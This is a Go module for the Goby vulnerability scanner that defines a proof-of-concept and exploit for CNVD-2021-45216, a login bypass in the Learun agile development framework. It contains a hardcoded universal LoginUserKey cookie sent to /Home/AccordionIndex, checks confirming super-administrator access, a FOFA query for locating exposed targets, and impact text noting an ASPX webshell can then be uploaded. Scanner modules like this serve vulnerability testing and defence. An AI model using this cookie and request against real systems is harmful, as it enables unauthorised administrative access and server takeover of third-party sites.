package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

func init() {
    expJson := `{
    "Name": "ShanghailearunDevelopmentframework loginbypass (CNVD-2021-45216)",
    "Description": "<p>The agile development framework of Shanghai lisoft Information Technology Co., Ltd. is based on Net MVC. It is used to realize the development of various business systems, such as OA, ERP, MIS, CRM, e-commerce platform and so on. The framework itself is a secondary development platform, and developers can directly generate functional modules according to the configuration of development guide; But it is also a set of source code. Developers can also directly develop based on the framework in VS, and even extend the development framework.</p><p>The agile development framework of Shanghai lisoft Information Technology Co., Ltd. has a logic flaw vulnerability, which can be used by attackers to obtain sensitive information, upload Trojan files and obtain host permissions.</p>",
    "Product": "Agile development framework of Shanghai lisoft Information Technology Co., Ltd",
    "Homepage": "https://www.learun.cn/Home/CaseContent?id=demo5",
    "DisclosureDate": "2021-07-28",
    "Author": "AirPods",
    "FofaQuery": "body=\"/Home/AccordionIndex\"",
    "GobyQuery": "body=\"/Home/AccordionIndex\"",
    "Level": "3",
    "Impact": "<p>You can log in the background through the general cookie vulnerability. After successful login, if there is a file center function, you can upload webshell (ASPX) directly</p>",
    "Recommendation": "<p>At present, the manufacturer has not provided relevant vulnerability patch links. Please follow the manufacturer's homepage to update it in time:</p><p><a href=\"https://www.learun.cn/\">https://www.learun.cn/</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Home/AccordionIndex",
                "follow_redirect": true,
                "header": {
                    "Cookie": "LoginUserKey=13C2C1A702AE2DE0B13BAE5085D505F75E94A75EFE2500EC034DF8E3BE42BA36EA6EE41F2890656FE1073EFC6A92DCCF30367C8AFBAE0C34F0AC4F76B8C0995F73E764F9DDC7464272886569FBF022E1E2F6AA660D98726196A52EE3D49CF23551B118CE998A80BA2DF082D251F7411EDC6F055586EE5FD0F821B8AAA1E9B1C0FB69D508A9EC5536060349B467EEA2BADBA50F7383A2F997C6E8D057F8F434E1EAF92C642D04E179CF8F1D0FC1205FAF989DD811574D86FB781EF9623D2C9963AE101FF5F244EEE88C998F80CF554B4221D15969D5BC5D63C912D21D668581DC04AF3C0373EDA26601BC6157271F91F7F3087B03AE0D2304347BDCD129D94421A804D23CCFF4851D1559B78B6643B38720D4F3DD28D24EF120D19EFDBF8B6E5195AFA767736E3DCB00CDEA2983B0FE5815A97406D8D89ACF33528D961B701B0AE605261D80DEB27453806A4DBB38B5259BCCFA1E0CDB406A53C31258FC90F0136CA25631DF6E6487CC16CEF97330926F71AADDE01BDB149035BED1921D7321177BB3484BA8D134C07675660EE8D203AA6929B88D6995D485;"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "learunui-framework.js",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "超级管理员",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Home/AccordionIndex",
                "follow_redirect": true,
                "header": {
                    "Cookie": "LoginUserKey=13C2C1A702AE2DE0B13BAE5085D505F75E94A75EFE2500EC034DF8E3BE42BA36EA6EE41F2890656FE1073EFC6A92DCCF30367C8AFBAE0C34F0AC4F76B8C0995F73E764F9DDC7464272886569FBF022E1E2F6AA660D98726196A52EE3D49CF23551B118CE998A80BA2DF082D251F7411EDC6F055586EE5FD0F821B8AAA1E9B1C0FB69D508A9EC5536060349B467EEA2BADBA50F7383A2F997C6E8D057F8F434E1EAF92C642D04E179CF8F1D0FC1205FAF989DD811574D86FB781EF9623D2C9963AE101FF5F244EEE88C998F80CF554B4221D15969D5BC5D63C912D21D668581DC04AF3C0373EDA26601BC6157271F91F7F3087B03AE0D2304347BDCD129D94421A804D23CCFF4851D1559B78B6643B38720D4F3DD28D24EF120D19EFDBF8B6E5195AFA767736E3DCB00CDEA2983B0FE5815A97406D8D89ACF33528D961B701B0AE605261D80DEB27453806A4DBB38B5259BCCFA1E0CDB406A53C31258FC90F0136CA25631DF6E6487CC16CEF97330926F71AADDE01BDB149035BED1921D7321177BB3484BA8D134C07675660EE8D203AA6929B88D6995D485;"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "learunui-framework.js",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "超级管理员",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|COOKIE: LoginUserKey=13C2C1A702AE2DE0B13BAE5085D505F75E94A75EFE2500EC034DF8E3BE42BA36EA6EE41F2890656FE1073EFC6A92DCCF30367C8AFBAE0C34F0AC4F76B8C0995F73E764F9DDC7464272886569FBF022E1E2F6AA660D98726196A52EE3D49CF23551B118CE998A80BA2DF082D251F7411EDC6F055586EE5FD0F821B8AAA1E9B1C0FB69D508A9EC5536060349B467EEA2BADBA50F7383A2F997C6E8D057F8F434E1EAF92C642D04E179CF8F1D0FC1205FAF989DD811574D86FB781EF9623D2C9963AE101FF5F244EEE88C998F80CF554B4221D15969D5BC5D63C912D21D668581DC04AF3C0373EDA26601BC6157271F91F7F3087B03AE0D2304347BDCD129D94421A804D23CCFF4851D1559B78B6643B38720D4F3DD28D24EF120D19EFDBF8B6E5195AFA767736E3DCB00CDEA2983B0FE5815A97406D8D89ACF33528D961B701B0AE605261D80DEB27453806A4DBB38B5259BCCFA1E0CDB406A53C31258FC90F0136CA25631DF6E6487CC16CEF97330926F71AADDE01BDB149035BED1921D7321177BB3484BA8D134C07675660EE8D203AA6929B88D6995D485;||"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2021-45216"
    ],
    "CVSSScore": "9.1",
    "Translation": {
        "CN": {
            "Name": "上海力软敏捷开发框架登陆绕过漏洞",
            "Product": "上海力软信息技术有限公司 敏捷开发框架",
            "Description": "<p>上海力软信息技术有限公司敏捷开发框架的主架为基于.net MVC的BS构架。用于实现各类业务系统，如OA、ERP、MIS、CRM、电商平台等系统的开发。框架本身是一个可二次开发平台，开发者可以根据开发尚导进行配置直接生成功能模块；但是他又是一套源代码，开发者也可以直接在VS中基于框架做开发，甚至还可以对开发框架进行发扩展。</p><p>上海力软信息技术有限公司敏捷开发框架存在逻辑缺陷漏洞，攻击者可利用该漏洞获取敏感信息、上传木马文件获取主机权限等。</p>",
            "Recommendation": "<p>目前厂商尚未提供相关漏洞补丁链接，请关注厂商主页及时更新：</p><p><a href=\"https://www.learun.cn/\">https://www.learun.cn/</a></p>",
            "Impact": "<p>可通过通用cookie漏洞登陆后台，登陆成功后，如果有文件中心功能可直接上传webshell（aspx），进而控制服务器。<br><br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "ShanghailearunDevelopmentframework loginbypass (CNVD-2021-45216)",
            "Product": "Agile development framework of Shanghai lisoft Information Technology Co., Ltd",
            "Description": "<p>The agile development framework of Shanghai lisoft Information Technology Co., Ltd. is based on Net MVC. It is used to realize the development of various business systems, such as OA, ERP, MIS, CRM, e-commerce platform and so on. The framework itself is a secondary development platform, and developers can directly generate functional modules according to the configuration of development guide; But it is also a set of source code. Developers can also directly develop based on the framework in VS, and even extend the development framework.</p><p>The agile development framework of Shanghai lisoft Information Technology Co., Ltd. has a logic flaw vulnerability, which can be used by attackers to obtain sensitive information, upload Trojan files and obtain host permissions.</p>",
            "Recommendation": "<p>At present, the manufacturer has not provided relevant vulnerability patch links. Please follow the manufacturer's homepage to update it in time:</p><p><a href=\"https://www.learun.cn/\">https://www.learun.cn/</a></p>",
            "Impact": "<p>You can log in the background through the general cookie vulnerability. After successful login, if there is a file center function, you can upload webshell (ASPX) directly<br><br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}
